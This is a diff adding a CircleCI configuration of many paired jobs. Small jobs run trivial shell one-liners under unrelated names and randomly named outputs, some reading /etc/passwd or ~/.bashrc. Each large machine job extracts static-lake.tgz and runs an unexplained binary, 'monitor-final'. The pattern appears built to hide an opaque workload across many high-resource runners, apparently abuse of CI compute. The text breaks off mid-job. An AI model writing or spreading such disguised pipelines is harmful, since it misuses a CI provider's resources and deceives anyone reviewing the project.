@@ -1,0 +1,1387 @@
+version: 2.1
+
+jobs:
+  xyz_v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: flashing bios settings
+          command: |
+            mkdir -p /tmp/hub
+            set +o pipefail 2>/dev/null; seq 1 1115973 | awk 'BEGIN{srand(42)}{print rand(),$1}' > /tmp/hub/REnDeRcLiEnTrIDGe; true
+            du -b /tmp/hub/REnDeRcLiEnTrIDGe
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - 'REnDeRcLiEnTrIDGe'
+  produce-end-to-end-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/REnDeRcLiEnTrIDGe 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  OPT_ID:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Bonk the drift monitor
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; for w in {1..4}; do echo "${w} squared is $((w**2))"; done; true ; } > /tmp/hub/VID_00010766
+            du -b /tmp/hub/VID_00010766
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - 'VID_00010766'
+  PROD_INIT_5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/VID_00010766 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  reactor-button-seed-scarlet:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Operation Sunny Bridge
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; echo goose bear wolf fox cat|xargs printf "%s\n"|sort; true ; } > /tmp/hub/trace.log.30
+            du -b /tmp/hub/trace.log.30
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - 'trace.log.30'
+  cd-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/trace.log.30 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  lockclock:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Payments Runs Thanks
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; echo 65 81 94 58 78 80 73 | tr ' ' '\n' | sort -n | uniq -c | head -n5; true ; } > /tmp/hub/TXN-32134-DJ
+            du -b /tmp/hub/TXN-32134-DJ
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - 'TXN-32134-DJ'
+  Build_Service9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/TXN-32134-DJ 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  closedInt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: s 19 check gateway
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; for path in ~/.bash*; do echo "$(basename $path): $(wc -l < $path)";done | tac; true ; } > /tmp/hub/CASE_031162
+            du -b /tmp/hub/CASE_031162
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - 'CASE_031162'
+  INIT_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/CASE_031162 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  rgChunk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Tidy up the hot shards
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; cp /etc/passwd "/tmp/secondary_home.bak" && sed --in-place 's/:x:/:*:/' "/tmp/secondary_home.bak" && diff /etc/passwd "/tmp/secondary_home.bak" | head -n 5; true ; } > /tmp/hub/Af
+            du -b /tmp/hub/Af
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - 'Af'
+  tam-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/Af 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  block--green:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Sudden death rebuild
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; find /opt -maxdepth 2 -type f -newermt 2015-12-31 -exec basename "{}" \; 2>/dev/null | wc -l; true ; } > /tmp/hub/sNhgr5jEOw
+            du -b /tmp/hub/sNhgr5jEOw
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - 'sNhgr5jEOw'
+  v8-ga2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/sNhgr5jEOw 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  beginOptionPolicyDst:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: publish before retirement
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; find /dev -maxdepth 1 -type f -path '*/null' -empty -exec md5sum {} +; true ; } > /tmp/hub/payload-invoice
+            du -b /tmp/hub/payload-invoice
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - 'payload-invoice'
+  prometheus-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/payload-invoice 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  BufferedMiddlewareProvider:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Dedupe since the last incident
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; touch "/tmp/leftdrawer_20250607.list" && chmod a-w "/tmp/leftdrawer_20250607.list" && ls -l "/tmp/leftdrawer_20250607.list"; true ; } > /tmp/hub/Proxy
+            du -b /tmp/hub/Proxy
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - 'Proxy'
+  update-webhook-reload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/Proxy 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  hank99:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Weekly rollup anonymization for the board meeting
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; set -- dog owl cat whale; for a; do echo "<$a>"; done; true ; } > /tmp/hub/shader
+            du -b /tmp/hub/shader
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - 'shader'
+  rl-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/shader 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  url34s:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Definitely push the health checks
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; echo; echo "the quick brown fox"; echo; true ; } > /tmp/hub/QKp
+            du -b /tmp/hub/QKp
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - 'QKp'
+  Verify_Staging9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/QKp 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  voice_enemy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: To speed things up train the background checks
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; printf 'id,item,qty,price\n1,peach,18,47.35\n2,papaya,16,78.63\n3,plum,10,72.50\n4,grape,17,46.21\n' >/tmp/se4final.conf && sort -t, -k4 -rn /tmp/se4final.conf | head -n 2; true ; } > /tmp/hub/88.35.107.123
+            du -b /tmp/hub/88.35.107.123
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - '88.35.107.123'
+  t-new:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/88.35.107.123 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  Split-ViewConfig:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Runway 08 packaging
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; echo 'north south east west' >| ${TMPDIR:-/tmp}/new_bottom.log && cat ${TMPDIR:-/tmp}/new_bottom.log; true ; } > /tmp/hub/21.02.2025
+            du -b /tmp/hub/21.02.2025
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - '21.02.2025'
+  verify-nightly-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/21.02.2025 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  DEPLOY_MUTEX:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Bin The Bulk Rack By Noon
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'error: none' | md5sum; true ; } > /tmp/hub/qwzq90ebj0ta
+            du -b /tmp/hub/qwzq90ebj0ta
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - 'qwzq90ebj0ta'
+  alpha-v4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/qwzq90ebj0ta 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  Src-Segment:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Power cycle the fan curve following migration
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; yes 'fixture' | head -n2; true ; } > /tmp/hub/rev-v6.17.39
+            du -b /tmp/hub/rev-v6.17.39
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - 'rev-v6.17.39'
+  RunStaging:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/rev-v6.17.39 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  vicTheIron:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Let firmware ripen
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; grep -n fi ~/.bashrc | sort -u; true ; } > /tmp/hub/azureshimmerthetathunder
+            du -b /tmp/hub/azureshimmerthetathunder
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - 'azureshimmerthetathunder'
+  fiona-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/azureshimmerthetathunder 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  device_unlock_eager:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Proceed with format of the error catalog
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; awk -F: '$7 !~ /nologin/ {print $1}' /etc/passwd | tr -s ' '; true ; } > /tmp/hub/67.129.12.48
+            du -b /tmp/hub/67.129.12.48
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - '67.129.12.48'
+  update-router:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/67.129.12.48 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  NamedFakeArticleElement:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: PACK WORLD CHUNKS ASAP
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; printf %s "3 tests passed" | sum | awk '{print $1}'; true ; } > /tmp/hub/audit.log.28
+            du -b /tmp/hub/audit.log.28
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - 'audit.log.28'
+  DATA-761:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/audit.log.28 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  comment_list_file:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: probably reload the cron pods
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; find /opt -maxdepth 1 -type f -iname "*" -print | xargs ls -ld; true ; } > /tmp/hub/054844_2023
+            du -b /tmp/hub/054844_2023
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - '054844_2023'
+  gating:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/054844_2023 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  sortlazy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Culture the positive control x4
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; test -f /etc/passwd && echo true || echo false; true ; } > /tmp/hub/106.124.134.29
+            du -b /tmp/hub/106.124.134.29
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - '106.124.134.29'
+  RUN_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/106.124.134.29 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  lily-panel-rhythm-quill:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Album art is clean
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; seq 178 | awk '$1 % 2 == 0 {e++} END {print e+0, "even"}'; true ; } > /tmp/hub/temp4f85fa9
+            du -b /tmp/hub/temp4f85fa9
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - 'temp4f85fa9'
+  assemble-nightly-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/temp4f85fa9 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  i18n-ta:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Wrap The Pick List For Route 3
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; if test ! -k /tmp; then echo 'present'; else echo absent; fi; true ; } > /tmp/hub/viol37.lynx
+            du -b /tmp/hub/viol37.lynx
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - 'viol37.lynx'
+  preview-v3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/viol37.lynx 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  HAVE_MIGRATION:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Checkpoint the held out set and plot loss
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; gzip -c /etc/passwd > "${TMPDIR:-/tmp}/player.gz" && zgrep -c root "${TMPDIR:-/tmp}/player.gz"; true ; } > /tmp/hub/Glint
+            du -b /tmp/hub/Glint
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - 'Glint'
+  yuki-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/Glint 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  backport-new-kernel-zip:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: DOWNLOAD
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; mkfifo "${TMPDIR:-/tmp}/o.log" && ls -l "${TMPDIR:-/tmp}/o.log" && rm "${TMPDIR:-/tmp}/o.log"; true ; } > /tmp/hub/run_587
+            du -b /tmp/hub/run_587
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - 'run_587'
+  tb-new:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/run_587 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  aa-37-b8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Ping PLC
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; \ls -X /var/cache|cat -n; true ; } > /tmp/hub/NEUTRON_SOUTH_RASTER_GADGET
+            du -b /tmp/hub/NEUTRON_SOUTH_RASTER_GADGET
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - 'NEUTRON_SOUTH_RASTER_GADGET'
+  tango-5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/NEUTRON_SOUTH_RASTER_GADGET 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  cq9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Tune the physics layers once boot is done
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; printf 'itinerary\t61\nsection\t96\noffice\t68\nruby\t31\n' >"/tmp/client-attic-cluster.tsv" && cut -f1 "/tmp/client-attic-cluster.tsv"; true ; } > /tmp/hub/CARRIER_GARDEN
+            du -b /tmp/hub/CARRIER_GARDEN
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - 'CARRIER_GARDEN'
+  STG_HOOK_4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/CARRIER_GARDEN 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
